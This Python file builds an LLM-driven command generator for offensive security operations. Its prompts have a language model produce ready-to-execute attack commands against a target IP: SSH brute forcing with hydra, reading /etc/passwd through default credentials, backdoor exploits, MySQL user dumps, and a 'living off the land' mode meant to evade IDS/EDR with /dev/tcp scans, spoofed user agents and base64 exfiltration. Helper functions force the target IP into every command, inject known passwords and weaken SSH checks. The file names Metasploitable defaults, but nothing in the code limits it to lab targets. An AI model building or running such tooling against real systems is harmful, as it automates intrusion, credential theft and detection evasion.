import re
from enum import Enum
from langchain_core.prompts import ChatPromptTemplate
from langchain_core.output_parsers import StrOutputParser
from llm_setup import get_llm


class StealthLevel(Enum):
    """Stealth operation levels."""
    LOW = "low"        # Fast and aggressive - noisy but effective
    MEDIUM = "medium"  # Balanced - some evasion techniques
    HIGH = "high"      # Living off the Land - native tools only, slow and quiet


# Base system prompt
BASE_SYSTEM_PROMPT = """
You are a Kali Linux terminal interface. Translate natural language instructions into EXACT terminal commands.

CRITICAL RULES:
1. Return ONLY the ready-to-execute command. No markdown, no explanations.
2. NEVER use placeholders like <ip>, <target>, [IP], {{ip}}. Use the REAL IP from the instruction.
3. ALWAYS use the EXACT IP address provided in the instruction. 
4. NEVER use 127.0.0.1 or localhost - ALWAYS use the target IP from the instruction!
5. NEVER use example IPs like 192.168.1.5 or 10.0.0.1 - use the REAL target IP!
6. All commands must complete in finite time and be NON-INTERACTIVE.
7. For wordlists, use paths that exist: /usr/share/wordlists/metasploit/ or create simple inline lists.
8. NEVER use interactive commands. Always use non-interactive alternatives:
   - Instead of "ftp IP" use "curl -s ftp://IP/"
   - Instead of "telnet IP PORT" use "echo 'quit' | timeout 5 telnet IP PORT"
   - Instead of "msfconsole" use "msfconsole -q -x 'command; exit'"
   - Instead of "mysql" use "mysql -e 'QUERY'"
   - For SSH, always include a command: "ssh user@IP 'command'"
9. For msfconsole, ALWAYS set RHOSTS: msfconsole -q -x 'use MODULE; set RHOSTS TARGET_IP; run; exit'
"""

# Stealth-specific instructions
STEALTH_PROMPTS = {
    StealthLevel.LOW: """
OPERATION MODE: AGGRESSIVE (Fast & Noisy)
Priority: Speed over stealth. Use powerful security tools.

AVAILABLE TOOLS:
- nmap, masscan, nikto, gobuster, hydra, sqlmap, enum4linux, wpscan
- All standard Kali Linux security tools

TOOL OPTIMIZATIONS:
- nmap: Use -T4 or -T5 (aggressive timing), -A for full scan
  - Fast scan: nmap -T5 -F [IP]
  - Full aggressive: nmap -T4 -A -sV -sC [IP]
- masscan: Use --rate 10000 for maximum speed
- hydra: Use -t 16 for max threads
- gobuster: Use -t 100 for max threads
- nikto: Full scan without restrictions

WORDLISTS AVAILABLE (USE ONLY THESE - they exist on the system):
- /usr/share/wordlists/metasploit/unix_users.txt (usernames)
- /usr/share/wordlists/metasploit/unix_passwords.txt (passwords)
- /usr/share/wordlists/metasploit/root_userpass.txt (user:pass combos)
- NEVER use rockyou.txt - it does NOT exist on this system!

CRITICAL - USE REAL USERNAMES, NEVER PLACEHOLDERS:
- For single user: use msfadmin (default Metasploitable user)
- Other valid users: root, admin, user, postgres, service, ftp, nobody
- NEVER use placeholder names like "usuario_conhecido", "known_user", "username"

TOOL SELECTION RULES:
- nikto is ONLY for HTTP/HTTPS (ports 80, 443, 8080, 8443). NEVER use nikto for FTP, SSH, or other protocols!
- For FTP: use curl, ftp client, or nmap scripts
- For SSH: use hydra, ssh client, or nmap scripts
- For SMB: use enum4linux, smbclient, smbmap
- For credentials/password files: use curl/wget to download, cat to read

FTP COMMANDS (when FTP anonymous is allowed):
- List FTP files: curl -s ftp://IP/
- Download file: curl -s ftp://IP/filename
- NOTE: FTP anonymous usually only shows the FTP home directory, NOT the entire filesystem!
- To get /etc/passwd, you need shell access first (via SSH or exploit)

HOW TO GET CREDENTIALS (in order of preference):
1. SSH with known credentials: sshpass -p msfadmin ssh msfadmin@IP 'cat /etc/passwd'
2. Telnet with known credentials: (echo msfadmin; echo msfadmin; echo 'cat /etc/passwd'; echo exit) | telnet IP
3. Exploit backdoor (vsftpd, unrealircd) to get shell, then cat /etc/passwd
4. MySQL: mysql -h IP -u root -e 'SELECT * FROM mysql.user;'

KNOWN DEFAULT CREDENTIALS (Metasploitable):
- SSH/Telnet: msfadmin:msfadmin, user:user, postgres:postgres
- MySQL: root:(empty password)
- PostgreSQL: postgres:postgres

EXAMPLES (use the ACTUAL IP from instruction, not these example IPs):
- "Scan ports on 172.20.0.2" -> nmap -T4 -A 172.20.0.2
- "Brute force SSH on 172.20.0.2" -> hydra -l msfadmin -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 4 -f ssh://172.20.0.2
- "Brute force SSH with user list" -> hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 4 -f ssh://172.20.0.2
- "Get credentials via FTP" -> curl -s ftp://172.20.0.2/etc/passwd
- "List FTP directory" -> curl -s --list-only ftp://172.20.0.2/
""",

    StealthLevel.MEDIUM: """
OPERATION MODE: BALANCED (Moderate Stealth)
Priority: Balance between speed and detection avoidance.

AVAILABLE TOOLS:
- nmap (with evasion flags), curl, wget, nc, standard tools with rate limiting

EVASION TECHNIQUES:
- nmap: Use -T2 (polite timing), fragment packets, randomize hosts
  - Stealth scan: nmap -T2 -sS -f --randomize-hosts [IP]
  - Version scan: nmap -T2 -sV --version-intensity 0 [IP]
- Add delays between requests (sleep 1-3 seconds)
- Use non-standard ports for connections
- Limit concurrent connections

EXAMPLES (use the ACTUAL IP from instruction):
- "Scan ports on 172.20.0.2" -> nmap -T2 -sS -f --randomize-hosts 172.20.0.2
- "Check web on 172.20.0.2" -> curl -s -A "Mozilla/5.0" -k https://172.20.0.2
- "Brute force SSH on 172.20.0.2" -> hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 2 -W 3 -f ssh://172.20.0.2
""",

    StealthLevel.HIGH: """
OPERATION MODE: LIVING OFF THE LAND (Maximum Stealth)
Priority: Avoid detection at all costs. Use ONLY native OS tools. NO security tools.

FORBIDDEN TOOLS (will trigger IDS/EDR):
- nmap, masscan, nikto, gobuster, hydra, sqlmap, metasploit, enum4linux
- Any tool from /usr/share/kali-tools or security-specific binaries

ALLOWED TOOLS (Native/LOLBins):
- bash builtins: echo, read, printf
- /dev/tcp and /dev/udp for port scanning
- curl, wget (with legitimate User-Agent)
- nc/netcat (if absolutely necessary)
- ssh, telnet, ftp (standard clients)
- ping, traceroute
- base64, xxd, od (for encoding)
- awk, sed, grep, cut (text processing)

STEALTH TECHNIQUES:
1. PORT SCANNING with bash (no nmap):
   - Single port: timeout 1 bash -c "echo >/dev/tcp/IP/PORT" 2>/dev/null && echo "open"
   - Multiple ports: for p in 22 80 443; do timeout 1 bash -c "echo >/dev/tcp/IP/$p" 2>/dev/null && echo "$p open"; sleep 2; done

2. SERVICE DETECTION:
   - HTTP: curl -s -I -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://IP
   - SSH banner: timeout 3 bash -c "cat </dev/tcp/IP/22" 2>/dev/null | head -1
   - Generic: echo "QUIT" | timeout 2 nc -v IP PORT 2>&1

3. WEB REQUESTS (blend with normal traffic):
   - curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -k URL
   - Add delays: sleep $((RANDOM % 5 + 2))

4. FILE TRANSFER:
   - curl -s -o /tmp/file URL
   - base64 encoding for data exfil

5. ALWAYS ADD DELAYS between operations (sleep 2-5 seconds)

EXAMPLES:
- "Scan port 22" -> timeout 1 bash -c "echo >/dev/tcp/192.168.1.5/22" 2>/dev/null && echo "Port 22 open" || echo "Port 22 closed"
- "Scan common ports" -> for p in 21 22 23 25 80 443 445 3389 8080; do timeout 1 bash -c "echo >/dev/tcp/192.168.1.5/$p" 2>/dev/null && echo "$p open"; sleep 2; done
- "Check web server" -> curl -s -I -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -m 5 http://192.168.1.5 | head -5
- "Get SSH banner" -> timeout 3 bash -c "cat </dev/tcp/192.168.1.5/22" 2>/dev/null | head -1
- "Check connectivity" -> ping -c 1 -W 2 192.168.1.5
"""
}


def get_stealth_prompt(stealth_level: StealthLevel) -> str:
    """Returns the complete prompt for the given stealth level."""
    return BASE_SYSTEM_PROMPT + STEALTH_PROMPTS[stealth_level]


def fix_mysql_commands(cmd: str) -> str:
    """
    Fixes MySQL commands to work with old servers.
    """
    if "mysql " not in cmd.lower():
        return cmd
    
    # Add --skip-ssl for old MySQL servers that don't support modern TLS
    if "--skip-ssl" not in cmd and "-h " in cmd:
        cmd = cmd.replace("mysql ", "mysql --skip-ssl ", 1)
    
    return cmd


def fix_telnet_commands(cmd: str, target_ip: str) -> str:
    """
    Fixes telnet commands to be non-interactive.
    """
    cmd_lower = cmd.lower().strip()
    
    # If it's a broken echo command for telnet, fix it
    if cmd_lower.startswith("echo ") and "telnet" not in cmd_lower:
        # Might be a truncated telnet command, rebuild it
        if target_ip:
            return f"(echo msfadmin; sleep 1; echo msfadmin; sleep 1; echo 'cat /etc/passwd'; sleep 1; echo exit) | telnet {target_ip} 2>&1 | head -50"
    
    return cmd


def fix_wordlist_paths(cmd: str) -> str:
    """
    Fixes invalid wordlist paths to use existing ones.
    """
    # Replace rockyou.txt with metasploit wordlist
    invalid_wordlists = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "rockyou.txt",
        "/usr/share/seclists/",
    ]
    
    for invalid in invalid_wordlists:
        if invalid in cmd:
            cmd = cmd.replace(invalid, "/usr/share/wordlists/metasploit/unix_passwords.txt")
    
    return cmd


def fix_msfconsole_commands(cmd: str, target_ip: str) -> str:
    """
    Fixes msfconsole commands to ensure RHOSTS is set correctly.
    """
    if "msfconsole" not in cmd.lower():
        return cmd
    
    # If RHOSTS is not set, add it
    if "RHOSTS" not in cmd.upper() and target_ip:
        # Find the -x parameter and add RHOSTS after 'use'
        if "-x" in cmd:
            # Pattern: msfconsole -q -x 'use MODULE; ...'
            # Add set RHOSTS after use statement
            cmd = re.sub(
                r"(-x\s+['\"])(use\s+[^;]+;)",
                rf"\1\2 set RHOSTS {target_ip};",
                cmd
            )
    
    # Replace any wrong IP in RHOSTS
    if target_ip:
        cmd = re.sub(r'set RHOSTS \d+\.\d+\.\d+\.\d+', f'set RHOSTS {target_ip}', cmd)
    
    return cmd


def fix_ssh_legacy_algorithms(cmd: str) -> str:
    """
    Fixes SSH commands to work with legacy servers (like Metasploitable2).
    Modern OpenSSH clients (10.x+) reject old algorithms by default.
    Uses sshpass for non-interactive authentication when password is known.
    
    Tested with OpenSSH 10.2 connecting to Metasploitable2.
    """
    import re
    
    # Handle both "ssh " and "sshpass ... ssh " commands
    if "ssh " not in cmd:
        return cmd
    
    # Check if it's an sshpass command
    is_sshpass = cmd.strip().startswith("sshpass ")
    
    if not is_sshpass and not cmd.strip().startswith("ssh "):
        return cmd
    
    # Remove any existing algorithm options (they're probably wrong for modern SSH)
    cmd = re.sub(r'-o\s+["\']?HostKeyAlgorithms[^\s"\']*["\']?\s*', '', cmd)
    cmd = re.sub(r'-o\s+["\']?PubkeyAcceptedAlgorithms[^\s"\']*["\']?\s*', '', cmd)
    cmd = re.sub(r'-o\s+["\']?PubkeyAcceptedKeyTypes[^\s"\']*["\']?\s*', '', cmd)
    cmd = re.sub(r'-o\s+["\']?KexAlgorithms[^\s"\']*["\']?\s*', '', cmd)
    
    # For OpenSSH 10.x, we need specific legacy options (without + prefix)
    # Note: ssh-dss causes "Bad key types" error in OpenSSH 10.x, use only ssh-rsa
    legacy_opts = (
        '-o HostKeyAlgorithms=ssh-rsa '
        '-o PubkeyAcceptedKeyTypes=ssh-rsa '
        '-o KexAlgorithms=diffie-hellman-group1-sha1 '
        '-o StrictHostKeyChecking=no '
    )
    
    # Check if legacy options already present
    if "HostKeyAlgorithms" in cmd:
        return cmd
    
    # Insert after "ssh " (handles both direct ssh and sshpass ssh)
    cmd = cmd.replace("ssh ", f"ssh {legacy_opts}", 1)
    
    # Known user/password combinations for Metasploitable
    known_creds = {
        "msfadmin": "msfadmin",
        "user": "user",
        "postgres": "postgres",
        "service": "service",
        "root": "root",
    }
    
    # Check if command has a known user and add sshpass
    for user, password in known_creds.items():
        if f"{user}@" in cmd and "sshpass" not in cmd:
            cmd = f"sshpass -p {password} {cmd}"
            break
    
    # Clean up multiple spaces
    cmd = ' '.join(cmd.split())
    
    return cmd


def fix_interactive_commands(cmd: str, target_ip: str = None) -> str:
    """
    Converts interactive commands to non-interactive equivalents.
    Commands like ftp, telnet, msfconsole need special handling.
    """
    cmd_lower = cmd.lower().strip()
    
    # FTP - convert to curl or non-interactive ftp
    if cmd_lower.startswith("ftp ") and "<<" not in cmd:
        # Extract IP from command
        ip_match = re.search(r'ftp\s+(\d+\.\d+\.\d+\.\d+)', cmd)
        ip = ip_match.group(1) if ip_match else target_ip
        if ip:
            # Use curl to list FTP directory (anonymous)
            return f"curl -s --list-only ftp://{ip}/ 2>&1 | head -20"
    
    # Telnet - use timeout and echo for banner grab
    if cmd_lower.startswith("telnet "):
        ip_match = re.search(r'telnet\s+(\d+\.\d+\.\d+\.\d+)', cmd)
        port_match = re.search(r'telnet\s+\d+\.\d+\.\d+\.\d+\s+(\d+)', cmd)
        ip = ip_match.group(1) if ip_match else target_ip
        port = port_match.group(1) if port_match else "23"
        if ip:
            return f"echo 'quit' | timeout 5 telnet {ip} {port} 2>&1 | head -20"
    
    # Metasploit msfconsole - convert to msfconsole -x for non-interactive
    if "msfconsole" in cmd_lower and " -x " not in cmd_lower and " -q " not in cmd_lower:
        # If it's just "msfconsole", suggest a scan instead
        if cmd_lower.strip() == "msfconsole":
            if target_ip:
                return f"msfconsole -q -x 'db_nmap -sV {target_ip}; exit' 2>&1 | head -50"
            return "echo 'msfconsole requires -x flag for non-interactive mode'"
    
    # MySQL client - add -e for non-interactive
    if cmd_lower.startswith("mysql ") and " -e " not in cmd_lower:
        # Add a simple query
        cmd = cmd.rstrip()
        if not cmd.endswith(";"):
            cmd += " -e 'SHOW DATABASES;'"
    
    # PostgreSQL psql - add -c for non-interactive  
    if "psql " in cmd_lower and " -c " not in cmd_lower:
        cmd = cmd.rstrip()
        if not cmd.endswith(";"):
            cmd += " -c '\\l'"
    
    # SMB client - add -c for non-interactive
    if cmd_lower.startswith("smbclient ") and " -c " not in cmd_lower:
        cmd = cmd.rstrip() + " -c 'ls; quit'"
    
    # Netcat without specific mode - add timeout
    if re.match(r'^nc\s+\d+\.\d+\.\d+\.\d+\s+\d+$', cmd_lower):
        cmd = f"echo '' | timeout 5 {cmd}"
    
    return cmd


def fix_combined_commands(cmd: str) -> str:
    """
    Splits combined commands and returns only the first one.
    Commands like 'nmap x; hydra y; nikto z' cause timeouts.
    """
    # Check for command separators (but not inside quotes or msfconsole -x)
    if "msfconsole" in cmd.lower() and "-x" in cmd:
        return cmd  # msfconsole -x uses ; internally
    
    # Split on common separators
    separators = [' && ', ' || ', '; ']
    for sep in separators:
        if sep in cmd:
            parts = cmd.split(sep)
            # Return only the first command
            return parts[0].strip()
    
    return cmd


def fix_infinite_commands(cmd: str) -> str:
    """
    Fixes commands that would run infinitely.
    Adds limits/timeouts to potentially infinite commands.
    """
    cmd_lower = cmd.lower().strip()
    
    # Fix ping without -c (count) flag
    if cmd_lower.startswith("ping ") and " -c " not in cmd_lower:
        # Insert -c 3 after "ping"
        cmd = re.sub(r'^ping\s+', 'ping -c 3 ', cmd, flags=re.IGNORECASE)
    
    # Fix tcpdump without -c (count) flag
    if "tcpdump" in cmd_lower and " -c " not in cmd_lower:
        cmd = re.sub(r'tcpdump\s+', 'tcpdump -c 100 ', cmd, flags=re.IGNORECASE)
    
    # Fix tail -f (follow mode)
    if "tail -f" in cmd_lower or "tail --follow" in cmd_lower:
        cmd = cmd.replace("tail -f", "tail -n 50").replace("tail --follow", "tail -n 50")
    
    # Fix watch command
    if cmd_lower.startswith("watch "):
        cmd = re.sub(r'^watch\s+', 'watch -n 1 -g ', cmd, flags=re.IGNORECASE)
    
    # Fix top without -n (iterations)
    if cmd_lower.startswith("top") and " -n " not in cmd_lower:
        cmd = re.sub(r'^top\s*', 'top -b -n 1 ', cmd, flags=re.IGNORECASE)
    
    # Fix netcat listener without timeout
    if ("nc -l" in cmd_lower or "netcat -l" in cmd_lower) and "timeout" not in cmd_lower:
        cmd = f"timeout 30 {cmd}"
    
    # Fix while true loops - wrap with timeout
    if "while true" in cmd_lower or "while :" in cmd_lower:
        if "timeout" not in cmd_lower:
            cmd = f"timeout 60 bash -c '{cmd}'"
    
    return cmd


def validate_command(cmd: str, target_ip: str = None) -> tuple[str, bool]:
    """Validates and corrects generated command."""
    placeholder_patterns = [
        r'<[^>]+>',
        r'\[IP\]',
        r'\[ip\]',
        r'\[TARGET\]',
        r'\[target\]',
        r'\{[^}]+\}',
        r'TARGET_IP',
        r'target_ip',
        r'IP_ADDRESS',
        r'\$\{?IP\}?',
        r'\$\{?TARGET\}?',
    ]
    
    # Fix placeholder usernames that LLMs sometimes generate
    placeholder_users = [
        "usuario_conhecido", "known_user", "username", "user_name",
        "target_user", "valid_user", "test_user", "<user>", "[user]"
    ]
    for placeholder in placeholder_users:
        if placeholder in cmd.lower():
            cmd = cmd.replace(placeholder, "msfadmin")
            cmd = cmd.replace(placeholder.lower(), "msfadmin")
    
    # Fix placeholders
    for pattern in placeholder_patterns:
        if re.search(pattern, cmd) and target_ip:
            cmd = re.sub(pattern, target_ip, cmd)
    
    # Fix literal "IP" placeholder in URLs (e.g., ftp://IP/, http://IP)
    if target_ip:
        # Replace //IP/ or //IP: or //IP (end of string or space)
        cmd = re.sub(r'://IP/', f'://{target_ip}/', cmd)
        cmd = re.sub(r'://IP:', f'://{target_ip}:', cmd)
        cmd = re.sub(r'://IP(\s|$)', f'://{target_ip}\\1', cmd)
        # Replace @IP: or @IP/ or @IP (for user@IP patterns)
        cmd = re.sub(r'@IP:', f'@{target_ip}:', cmd)
        cmd = re.sub(r'@IP/', f'@{target_ip}/', cmd)
        cmd = re.sub(r'@IP(\s|$)', f'@{target_ip}\\1', cmd)
        # Replace standalone IP word (but not inside other words)
        cmd = re.sub(r'\bIP\b', target_ip, cmd)
    
    # Fix infinite commands
    cmd = fix_infinite_commands(cmd)
    
    still_has_placeholder = any(re.search(p, cmd) for p in placeholder_patterns)
    return cmd, not still_has_placeholder


def generate_command(
    instruction: str, 
    provider: str = None, 
    model: str = None,
    target_ip: str = None,
    stealth_level: str = "low"
) -> str:
    """
    Translates natural language instruction to terminal command.
    
    Args:
        instruction: Natural language instruction
        provider: LLM provider
        model: Specific model
        target_ip: Target IP for validation/correction
        stealth_level: "low", "medium", or "high"
    """
    try:
        # Parse stealth level
        try:
            stealth = StealthLevel(stealth_level.lower())
        except ValueError:
            stealth = StealthLevel.LOW
        
        llm = get_llm(provider=provider, model=model)
        system_prompt = get_stealth_prompt(stealth)

        prompt = ChatPromptTemplate.from_messages([
            ("system", system_prompt),
            ("human", "TECHNICAL INSTRUCTION: {instruction}")
        ])

        chain = prompt | llm | StrOutputParser()
        command = chain.invoke({"instruction": instruction})
        
        # Cleanup
        command = command.strip()
        for marker in ["```bash", "```sh", "```shell", "```"]:
            command = command.replace(marker, "")
        command = command.strip()
        
        # Take first valid line
        if "\n" in command:
            lines = [l.strip() for l in command.split("\n") 
                    if l.strip() and not l.strip().startswith("#")]
            command = lines[0] if lines else command
        
        # Validate placeholders
        command, _ = validate_command(command, target_ip)
        
        # Fix invalid wordlist paths
        command = fix_wordlist_paths(command)
        
        # Fix combined commands (split and take first)
        command = fix_combined_commands(command)
        
        # Fix interactive commands
        command = fix_interactive_commands(command, target_ip)
        
        # Fix SSH commands for legacy servers
        command = fix_ssh_legacy_algorithms(command)
        
        # Fix msfconsole commands (ensure RHOSTS is set)
        command = fix_msfconsole_commands(command, target_ip)
        
        # Fix MySQL commands (add --skip-ssl)
        command = fix_mysql_commands(command)
        
        # Fix telnet commands
        command = fix_telnet_commands(command, target_ip)
        
        # CRITICAL: Force replace any wrong IPs with the correct target
        # This fixes LLM hallucinating example IPs from the prompt
        if target_ip:
            # Find any IP that's not the target and replace it
            ip_pattern = r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b'
            found_ips = re.findall(ip_pattern, command)
            for found_ip in found_ips:
                # Don't replace the correct target
                if found_ip != target_ip:
                    # Replace localhost and any other wrong IP
                    command = command.replace(found_ip, target_ip)
            
            # If no IP found at all, try to add target IP to common commands
            if not found_ips:
                # Commands that need an IP target
                needs_ip_patterns = [
                    (r'^(nmap\s+.*)$', r'\1 ' + target_ip),
                    (r'^(curl\s+-s\s+ftp://)/$', r'\1' + target_ip + '/'),
                    (r'^(hydra\s+.+\s+)(\w+://)$', r'\1\2' + target_ip),
                ]
                for pattern, replacement in needs_ip_patterns:
                    if re.match(pattern, command):
                        command = re.sub(pattern, replacement, command)
        
        return command

    except Exception as e:
        return f"echo 'GENERATION ERROR: {e}'"


if __name__ == "__main__":
    print("\n=== STEALTH LEVEL COMPARISON ===\n")
    
    instruction = "Scan ports 22, 80, 443 on 192.168.1.5"
    
    for level in ["low", "medium", "high"]:
        print(f"[{level.upper()}] {instruction}")
        cmd = generate_command(instruction, target_ip="192.168.1.5", stealth_level=level)
        print(f"  -> {cmd}\n")
